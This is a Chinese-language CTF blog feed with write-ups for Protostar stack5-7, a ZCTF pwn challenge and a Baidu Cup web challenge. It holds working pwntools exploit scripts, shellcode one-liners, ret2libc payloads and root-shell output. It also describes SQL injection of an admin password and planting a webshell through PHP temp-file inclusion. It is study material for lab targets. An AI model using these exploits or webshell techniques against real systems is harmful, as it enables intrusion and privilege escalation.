&quot;end&quot;.</span><br><span class="line">&gt;x/1i $eip</span><br><span class="line">&gt;x/8wx $esp</span><br><span class="line">&gt;end</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534902782677.png" alt="1534902782677"></p><p>buf地址 0xf6ffefd0</p><p>offset  76</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">payload = sh + <span class="string">'a'</span>*(<span class="number">76</span>-len(sh)) + p32(<span class="number">0xf6ffefd0</span>) + <span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line">conn.send(payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>用qira真方便，一下子就出来了，搞gdb搞了我几个小时都没弄出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l GDB环境与非GDB环境下运行程序时，栈缓冲区的位置不一样；非GDB环境下的地址大于GDB环境下的地址；</span><br><span class="line"></span><br><span class="line">l 可以使用NOP Slot来消除栈缓冲区位置的不确定性；</span><br><span class="line"></span><br><span class="line">l gets缓冲区溢出需要进行特别的处理；</span><br><span class="line"></span><br><span class="line">使用特定的shellcode（关闭并重新打开stdin）或者使用管道；</span><br><span class="line"></span><br><span class="line">使用管道的示例：</span><br><span class="line"></span><br><span class="line">( python ~/pwn1.py ; cat ) | /opt/protostar/bin/stack5</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/luozhaotian/article/details/79894994" target="_blank" rel="noopener">https://blog.csdn.net/luozhaotian/article/details/79894994</a></p><h3 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h3><h4 id="Return-to-shellcode"><a href="#Return-to-shellcode" class="headerlink" title="Return to shellcode"></a>Return to shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">payload = sh+ <span class="string">'a'</span>*(<span class="number">80</span>-len(sh))+p32(<span class="number">0xf6ffefbc</span>)+<span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h4 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h4><p>As we cannot use the return address starting with <strong>0xbf</strong> we can simply use a ret instruction instead as the stack is executable this will put next memory address into EIP, and our shellcode will get executed which in this case is simply a <strong>trap</strong>instruction. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&apos;+(80-29)*&apos;\xcc&apos;+&apos;\xf9\x84\x04\x08&apos;+&apos;\xbc\xef\xff\xf6&apos;&quot;; cat) | ./stack6</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#payload=shellcode+padding+ret地址+shellcode地址</span></span><br><span class="line">payload = sh+ <span class="string">'a'</span>*(<span class="number">80</span>-len(sh))+p32(<span class="number">0x080484f9</span>) + p32(<span class="number">0xf6ffefbc</span>)+<span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h4 id="Return-to-libc"><a href="#Return-to-libc" class="headerlink" title="Return to libc"></a>Return to libc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br><span class="line">gdb-peda$ b getpath</span><br><span class="line">Breakpoint 1 at 0x804848a: file stack6/stack6.c, line 11.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/nick/protostar/bin/stack6 </span><br><span class="line"></span><br><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0xf7fba000 --&gt; 0x1a6da8 </span><br><span class="line">ECX: 0x63c1cf18 </span><br><span class="line">EDX: 0xffffd5d4 --&gt; 0xf7fba000 --&gt; 0x1a6da8 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0xffffd598 --&gt; 0xffffd5a8 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x59ff8b08 </span><br><span class="line">EIP: 0x804848a (&lt;getpath+6&gt;:mov    eax,0x80485d0)</span><br><span class="line">EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048484 &lt;getpath&gt;:push   ebp</span><br><span class="line">   0x8048485 &lt;getpath+1&gt;:mov    ebp,esp</span><br><span class="line">   0x8048487 &lt;getpath+3&gt;:sub    esp,0x68</span><br><span class="line">=&gt; 0x804848a &lt;getpath+6&gt;:mov    eax,0x80485d0</span><br><span class="line">   0x804848f &lt;getpath+11&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x8048492 &lt;getpath+14&gt;:call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">   0x8048497 &lt;getpath+19&gt;:mov    eax,ds:0x8049720</span><br><span class="line">   0x804849c &lt;getpath+24&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x59ff8b08 </span><br><span class="line">0004| 0xffffd534 --&gt; 0xffffd558 --&gt; 0xf7e1fc34 --&gt; 0x2aad </span><br><span class="line">0008| 0xffffd538 --&gt; 0xffffd550 --&gt; 0xffffffff </span><br><span class="line">0012| 0xffffd53c --&gt; 0x80482a1 (&quot;__libc_start_main&quot;)</span><br><span class="line">0016| 0xffffd540 --&gt; 0xf7ffd938 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd544 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd548 --&gt; 0xc2 </span><br><span class="line">0028| 0xffffd54c --&gt; 0xf7ea7716 (test   eax,eax)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getpath () at stack6/stack6.c:11</span><br><span class="line">11stack6/stack6.c: No such file or directory.</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e52e70 &lt;system&gt;</span><br><span class="line">gdb-peda$ x/s 0xf7e52e70</span><br><span class="line">0xf7e52e70 &lt;system&gt;:&quot;S\203\354\b\213D$\020\350\216&lt;\016&quot;</span><br><span class="line">gdb-peda$ info proc map</span><br><span class="line">process 22915</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /home/nick/protostar/bin/stack6</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /home/nick/protostar/bin/stack6</span><br><span class="line">0xf7e12000 0xf7e13000     0x1000        0x0 </span><br><span class="line">0xf7e13000 0xf7fb8000   0x1a5000        0x0 /lib32/libc-2.19.so</span><br><span class="line">0xf7fb8000 0xf7fba000     0x2000   0x1a5000 /lib32/libc-2.19.so</span><br><span class="line">0xf7fba000 0xf7fbb000     0x1000   0x1a7000 /lib32/libc-2.19.so</span><br><span class="line">0xf7fbb000 0xf7fbf000     0x4000        0x0 </span><br><span class="line">0xf7fd8000 0xf7fd9000     0x1000        0x0 </span><br><span class="line">0xf7fd9000 0xf7fdb000     0x2000        0x0 [vvar]</span><br><span class="line">0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]</span><br><span class="line">0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.19.so</span><br><span class="line">0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.19.so</span><br><span class="line">0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.19.so</span><br><span class="line">0xfffdd000 0xffffe000    0x21000        0x0 [stack]</span><br><span class="line">gdb-peda$ find 0xf7e13000,+999999 ,&quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;0xf7e13000,+999999&apos; in: ,/bin/sh ranges</span><br><span class="line">Not found</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/protostar/bin$ strings -a -t x /lib32/libc-2.19.so | grep /bin/sh</span><br><span class="line"> 15da8c /bin/sh</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> gdb-peda$ x/s 0xf7e13000+0x15da8c</span><br><span class="line">0xf7f70a8c:&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><p>前面在ubuntu虚拟机执行，但是找到的system是错误的，不可以执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0xf7f70a8c</span></span><br><span class="line"></span><br><span class="line">system_plt = <span class="number">0xf7e52e70</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">80</span>+p32(system_plt)+<span class="string">'b'</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">conn.recvuntil(<span class="string">"input path please: "</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>在Protostar虚拟机一样找到system和/bin/sh地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:/opt/protostar/bin$ (python -c &quot;print &apos;a&apos;*80+&apos;\xb0\xff\xec\xb7&apos;+&apos;\xc0\x60\xec\xb7&apos;+&apos;\xbf\x63\xfb\xb7&apos;&quot;; cat) | ./stack6</span><br><span class="line">input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa°ÿ춡aaaaaaaaaaa°ÿ츀`췿c</span><br><span class="line">id</span><br><span class="line">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span><br></pre></td></tr></table></figure><h3 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h3><p>gcc的编译特性使用<code>__builtin_return_address(level)</code>打印出一个函数的堆栈地址。其中 level代表是堆栈中第几层调用地址，<code>__builtin_return_address(0)</code>表示第一层调用地址，即当前函数，<code>__builtin_return_address(1)</code>表示第二层。 </p><p><a href="http://abcdxyzk.github.io/blog/2013/11/20/lang-c-buildin-addr/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2013/11/20/lang-c-buildin-addr/</a></p><h4 id="Ret2text-1"><a href="#Ret2text-1" class="headerlink" title="Ret2text"></a>Ret2text</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">sh = asm(shellcraft.sh())</span><br><span class="line">payload = sh+ <span class="string">'a'</span>*(<span class="number">80</span>-len(sh))+p32(<span class="number">0x08048544</span>) + p32(<span class="number">0xf6ffefbc</span>)+<span class="string">'0x90'</span>*<span class="number">20</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c &quot;print &apos;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&apos;+(80-29)*&apos;\xcc&apos;+&apos;\xbf\x84\x04\x08&apos;&quot;; cat) | nc localhost 4000</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/Protostart%20Stack%20Writeup.assets/1534999688770.png" alt="1534999688770"></p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack0&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack1&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack2&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack3&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack4&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack5&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack6&lt;/li&gt;
&lt;li style=&quot;list-style: none&quot;&gt;&lt;input type=&quot;checkbox&quot; checked&gt; stack7&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>SmashTheStackForFunAndProfit</title>
    <link href="http://blog.Lhaihai.wang/2018/08/14/%E4%B8%80%E9%81%93pwn%E9%A2%98/"/>
    <id>http://blog.Lhaihai.wang/2018/08/14/一道pwn题/</id>
    <published>2018-08-14T15:52:10.000Z</published>
    <updated>2018-08-24T15:00:09.405Z</updated>
    
    <content type="html"><![CDATA[<p>待施工</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaDCBA</span><br></pre></td></tr></table></figure><p><img src="E:\学业\hexo\blog\source\_posts\2018\08\14\一道pwn题.assets\1534265431907.png" alt="1534265431907"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'106.14.163.189'</span>,<span class="string">'9999'</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'a'</span>*<span class="number">68</span>+p32(<span class="number">0x41424344</span>))</span><br><span class="line">s=r.recvline()</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">s=r.recvline()</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>0x0804929A</p><p><img src="E:\学业\hexo\blog\source\_posts\2018\08\14\一道pwn题.assets\1534268993935.png" alt="1534268993935"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'106.14.163.189'</span>,<span class="string">'9999'</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'a'</span>*<span class="number">84</span>+p32(<span class="number">0x0804929A</span>))</span><br><span class="line">s=r.recvline()</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">s=r.recvline()</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>三个flag都拿到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'106.14.163.189'</span>,<span class="string">'9999'</span>)</span><br><span class="line"></span><br><span class="line">win2_addr = <span class="number">0x0804929A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">68</span>+p32(<span class="number">0x41424344</span>)+<span class="string">'a'</span>*<span class="number">8</span>+ p32(win2_addr)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> conn.recvline()</span><br><span class="line"><span class="keyword">print</span> conn.recvline()</span><br><span class="line"><span class="keyword">print</span> conn.recvline()</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZCTF&#123;gets_is_d4ng3r0US&#125;</span><br><span class="line">ZCTF&#123;Y0U_kN0VV_the_Byte_0rD3R&#125;</span><br><span class="line">ZCTF&#123;S3cr3t_0f_ST4ck_arch&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待施工&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://blog.Lhaihai.wang/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>百度杯十二月场-blog进阶版</title>
    <link href="http://blog.Lhaihai.wang/2018/08/14/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA-blog%E8%BF%9B%E9%98%B6%E7%89%88/"/>
    <id>http://blog.Lhaihai.wang/2018/08/14/百度杯十二月场-blog进阶版/</id>
    <published>2018-08-14T08:40:52.000Z</published>
    <updated>2018-08-14T11:14:34.186Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Blog-进阶篇"><a href="#Blog-进阶篇" class="headerlink" title="Blog 进阶篇"></a>Blog 进阶篇</h2><blockquote><p>Blog赛题是由melody设计的</p><p>十二月的百度杯挑战赛上线的是优化难度后的比赛</p><p>Blog·进阶篇 则是作者的原题，难度比挑战赛上线了几个梯度。</p><p>快来挑战吧！</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>从读网站上某个文件的角度去考虑，有以下几个角度：</p><ul><li>php伪协议包含读文件内容</li><li>上传webshell，执行命令读文件</li><li>上传php，读特定文件</li></ul><a id="more"></a><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>利用了php对POST上传文件临时保存的特性，以及与自包含递归爆内存的结合成功上传并包含了webshell </p><p>整理下php对一个post文件请求的正常处理流程：</p><p>1.manager.php接收一个Post请求，php在/tmp目录下创建我们post的文件</p><p>2.manager.php处理请求url，包含一个文件</p><p>3.manager.php进行文件处理</p><p>4.php删除/tmp目录下的临时文件</p><p>整理下这个漏洞的触发过程：</p><p>1.manager.php接收一个Post请求，php在/tmp目录下创建我们post的文件</p><p>2.manager.php处理请求url，不断自包含本身造成内存溢出</p><p>3.php发出内存溢出信号，清空缓冲区和调用堆栈，以便接收新的请求</p><p>4./tmp目录下的上传文件得以保留</p><p>5.包含/tmp目录下的上传文件形成webshell</p><p><a href="https://blog.csdn.net/qq_30123355/article/details/58165038" target="_blank" rel="noopener">https://blog.csdn.net/qq_30123355/article/details/58165038</a></p><p><a href="https://blog.csdn.net/qq_27446553/article/details/81447880" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/81447880</a></p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>post.php还是有insert注入</p><p>注入出管理员密码</p><blockquote><p>3177d917a0053c6161207e733c84356d </p></blockquote><p>md5解密</p><blockquote><p>19-10-1997 </p></blockquote><p>登录，发现php://filter用不了，但是文件包含还是可以用</p><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"http://9eb98e8b639143b7ba4a127e107fd49228a475abf67843f3.game.ichunqiu.com/blog_manage/manager.php?module=manager&amp;name=php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Upload"</span> id=<span class="string">"Upload"</span> value = <span class="string">"Upload"</span>&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA-blog%E8%BF%9B%E9%98%B6%E7%89%88.assets/1534242486496.png" alt="1534242486496"></p><p>上传<code>phpinfo();</code> ，利用kindeditor目录漏洞看到tmp多了文件</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA-blog%E8%BF%9B%E9%98%B6%E7%89%88.assets/1534242454115.png" alt="1534242454115"></p><p>这里name 为 php不能执行php文件，改为phpt或者php1啥的</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/I%E6%98%A5%E7%A7%8B/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%BA%8C%E6%9C%88%E5%9C%BA-blog%E8%BF%9B%E9%98%B6%E7%89%88.assets/1534242712626.png" alt="1534242712626"></p><p>看到被禁用了很多函数，不能执行shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,passthru,shell_exec,assert,eval,glob,imageftbbox,bindtextdomain,mkdir,dir, system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,symlink,chgrp,chmod,chown,dl,mail,readlink,stream_socket_server,fsocket, imap_mail,apache_child_terminate,posix_kill,proc_terminate,proc_get_status,syslog,openlog,ini_alter,chroot,fread,fgets,fgetss,file,readfile, ini_set,ini_restore,putenv,apache_setenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,file_get_contents,fpassthru,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,fputs,unlink, pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority, pcntl_setpriority</span><br></pre></td></tr></table></figure><p>发现没有禁用copy函数，把flag.php复制为txt，上传之后记得执行tmp文件，要不然只是上传了代码没有执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 